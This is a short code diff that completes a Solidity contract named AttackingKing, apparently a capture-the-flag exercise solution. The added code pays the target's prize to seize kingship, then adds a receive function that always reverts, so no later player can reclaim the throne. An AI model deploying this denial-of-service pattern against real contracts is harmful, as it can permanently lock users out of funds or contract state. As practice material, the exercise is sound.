@@ -12,5 +12,11 @@ contract AttackingKing {
 
     function hackContract() external {
         // Code me!
+        uint256 prize=King(payable(contractAddress)).prize();
+        contractAddress.call{value:prize}("");
     }
+receive() external payable {
+
+    require(1>11);
+}
 }
